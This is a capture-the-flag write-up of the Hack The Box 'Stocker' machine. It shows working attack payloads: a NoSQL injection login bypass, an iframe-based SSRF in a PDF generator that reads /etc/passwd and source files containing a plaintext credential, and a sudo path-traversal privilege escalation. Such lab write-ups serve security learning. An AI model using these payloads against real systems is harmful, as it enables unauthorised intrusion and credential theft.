# HTB Stocker

### Machine IP

```
10.10.11.196
```

### Scanning

```
nmap -sC -sV -Pn -T5 10.10.11.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 01:59 EST
Warning: 10.10.11.196 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.196
Host is up (0.26s latency).
Not shown: 700 closed tcp ports (conn-refused), 298 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So it appears that ports 22 and 80 are open.


### Adding to hosts

Adding `stocker.htb` to the hosts file...

```
$ vim /etc/hosts
```

```
...
10.10.11.196    stocker.htb
...
```

### Exploring stocker.htb

Seems like an "in-development" website that stocks goods to customers. Seems to be only one page with 'in-page' links included.

Page source doesn't seem to include anything interesting. The console seemingly outputs page position for some reason...

Let's run wfuzz to find some subdirectories...

```
$ wfuzz -c --hc 404 -w wordlists/dirbuster/directory-list-2.3-medium.txt http://stocker.htb/FUZZ
```

Nothing interesting came back.

And let's fun wfuzz to find subdomains...

```
$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -u 'http://stocker.htb' -H "Host: FUZZ.stocker.htb" --hc 301
```

We found something!

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"   
```

Let's quickly pop it in the hosts file and check it out!

```
$ vim /etc/hosts
```

```
...
10.10.11.196    stocker.htb dev.stocker.htb
...
```


### dev.stocker.htb

This page appears to feature a login panel for developers. Trying username and password as `admin` gives us nothing.

Let's try some SQL Injection.

Runing sqlmap as follows...

```
sqlmap -u http://dev.stocker.htb/login -p "username"
```

Presents us with...nothing useful. Thats SQLi down the drain. I previously learnt about NoSQLi. Might aswell give that a go!

Attempting a login with:
```
Username: admin'||'1==1
Password: cheese
```

No luck.

Let's delve further into NoSQL


### NoSQLi

Running [this tool](https://github.com/C4l1b4n/NoSQL-Attack-Suite) as follows...

```
$ python3 nosql-login-bypass.py -t http://dev.stocker.htb/login -u username -p password
```

Gives us the following output...

```
[*] Checking for auth bypass GET request...
[-] Login is probably NOT vulnerable to GET request auth bypass...

[*] Checking for auth bypass POST request...
[-] Login is probably NOT vulnerable to POST request auth bypass...

[*] Checking for auth bypass POST JSON request...
[+] Login is probably VULNERABLE to POST JSON request auth bypass!
[!] PAYLOAD: {"username": {"$ne": "dummyusername123"}, "password": {"$ne": "dummypassword123"}}
```

SO it appears that NoSQLi is possible via a POST JSON request!


### Burpsuite

Using the information from above, we can use Burpsuite to intercept a POST request and insert JSON (from the NoSQLi attck tool).

```
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 82
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: ***application/json***
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3ANVkdtXaLYGvF7_wKsoUmSRrjVrquY5a6.hBph5bZ%2BHKiIW25THWmp4z%2FNJgr2OQ%2BuLG0q55VgNO8
Connection: close

***{"username": {"$ne": "dummyusername123"}, "password": {"$ne": "dummypassword123"}}***
```

*** marks the two places where I have changed the data in the request.

THe response (in the Repeater tab) is...

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 24 Feb 2023 14:25:44 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

Where previously it was...

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 24 Feb 2023 14:29:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 92
Connection: close
X-Powered-By: Express
Location: /login?error=login-error
Vary: Accept

<p>Found. Redirecting to <a href="/login?error=login-error">/login?error=login-error</a></p>
```

This indicates the existence of a `/stock` page.

Let's follow the request via burpsuite to `/stock`.


### /stock

On this page, we see a "Buy Stock Now!" message. We also have 4 different items, a cup, bin, axe and toilet paper that we can add to the basket.

Inspecting the source, we can find some static javascript code which describes what to do the the items and basket.

WHen adding to the basket and submitting your purchase, you get the option to view a pdf invoice. Perhaps this invoice pdf can be exploited.

Exploring the pdf file information with exiftool..


```
$ exiftool 63f953f42e125849c49fa46d.pdf  
ExifTool Version Number         : 12.52
File Name                       : 63f953f42e125849c49fa46d.pdf
Directory                       : .
File Size                       : 38 kB
File Modification Date/Time     : 2023:02:24 19:20:18-05:00
File Access Date/Time           : 2023:02:24 19:20:33-05:00
File Inode Change Date/Time     : 2023:02:24 19:20:33-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:02:25 00:19:11+00:00
Modify Date                     : 2023:02:25 00:19:11+00:00
```

[I found this website](https://www.triskelelabs.com/microstrategy-ssrf-through-pdf-generator-cve-2020-24815) about exploitation of the skia pdf creator. Let's save this for a bit later. First, manual exploitation.

### Manual Exploitation w/ Burp

Using Burp Suite to intercept the traffic, I can see that on submitting a purchase, before the pdf is generated, some readable json data is sent across the wire. Let's try modifying it to include our own data.

Was:
```
{
  "basket":[
    ({
      _id: "638f116eeb060210cbd83a8f",
      title: "Bin",
      description: "It's a rubbish bin.",
      image: "bin.jpg",
      price: 76,
      currentStock: 15,
      __v: 0,
      amount: 1,
    },
    {
      _id: "638f116eeb060210cbd83a8d",
      title: "Cup",
      description: "It's a red cup.",
      image: "red-cup.jpg",
      price: 32,
      currentStock: 4,
      __v: 0,
      amount: 1,
    })
  ];
}
```

Now:
```
{
  "basket":[
    ({
      _id: "638f116eeb060210cbd83a8f",
      ***title: "A TOTALLY LEGIT ITEM",***
      description: "It's a rubbish bin.",
      image: "bin.jpg",
      price: 76,
      currentStock: 15,
      __v: 0,
      amount: 1,
    },
    {
      _id: "638f116eeb060210cbd83a8d",
      title: "Cup",
      description: "It's a red cup.",
      image: "red-cup.jpg",
      price: 32,
      currentStock: 4,
      __v: 0,
      amount: 1,
    })
  ];
}
```

Now in place of `Bin` the pdf shows `A TOTALLY LEGIT ITEM`!
We have manipulated the data!

Back to the [link from before](https://www.triskelelabs.com/microstrategy-ssrf-through-pdf-generator-cve-2020-24815).

### SSRF via PDF Generator

The article outlines a SSRF (Server-Side Request Forgery) attack.

Injecting an HTML iframe into the json data as follows, we get a fram displaying the contents of `/etc/passwd`:

```
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a91",
      ***"title": "<iframe src = \"file:///etc/passwd\" width=1000px height=1000px</iframe>",***
      "description": "It's an axe.",
      "image": "axe.jpg",
      "price": 12,
      "currentStock": 21,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

This gives us the following information:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Therefore we can find that one user is names `angoose`.

Let's try grabbing the `index.js` file from the web server with the `dev` subdomain. Hopefully we can find some useful information about logins there.

Payload:
```
"<iframe src = \"file:///var/www/dev/index.js\" width=1000px height=1000px</iframe>"
```

Returned information:
```
...
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
...
```

So, we have a username, `angoose` and a password, `IHeardPassphrasesArePrettySecure`.

### SSH

Let's try and login...

```
$ ssh angoose@10.10.11.196
password: IHeardPassphrasesArePrettySecure
```

Exploring:
```
$ ls
user.txt
```

```
$ cat user.txt
bf71238c172e40232ebf206963f00f06
```

We got our user flag!


### Getting root

Running `sudo -l`, we find that we can use `node` with root privileges.

```
$ sudo -l
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

After a quick check, we find that `vim` is avaliable to use.
Simple! Let's try and write some JavaScript to read the root file.

NOTE: To do this, we must be in our `home` directory

```
$ vim

const fs = require('fs');

fs.readFile('/root/root.txt', 'utf8', (err, data) => {
  if (err) {
    console.error(err);
    return;
  }
  console.log(data);
});

:wq hecked.js
```

So we have our `hecked.js` file. Now we have to run it. THe problem is, we can only run `sudo` on the `node` command with `.js` files within the `/usr/local/scripts` folder.

Luckily we can work around this security measure!

To run our script, let's do:

```
$ sudo node '/usr/local/scripts/../../../home/angoose/hecked.js' 
[sudo] password for angoose: 
aa30b8235cfa1991931d29096de0dd7c
```

We got the root flag!

Stocker: Pwned!
